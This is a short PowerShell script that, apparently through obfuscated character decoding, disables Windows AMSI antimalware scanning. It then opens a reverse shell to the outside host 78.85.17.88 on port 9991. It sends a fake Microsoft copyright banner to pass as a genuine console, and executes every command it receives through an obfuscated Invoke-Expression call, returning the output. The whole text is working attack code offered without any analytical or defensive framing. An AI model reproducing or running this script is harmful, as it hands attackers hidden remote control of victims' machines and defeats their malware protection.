$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){[string]($n..$m|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
$J = New-Object System.Net.Sockets.TCPClient("78.85.17.88", 9991);
$SS = $J.GetStream();
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
$SS.Write($OO,0,$OO.Length)
$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
$SS.Write($OO,0,$OO.Length)
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
$GG = (i`eX $DD 2>&1 | Out-String );
$H  = $GG + (pwd).Path + '> ';
$L = ([text.encoding]::UTF8).GetBytes($H);
$SS.Write($L,0,$L.Length);
$SS.Flush()};
$J.Close()
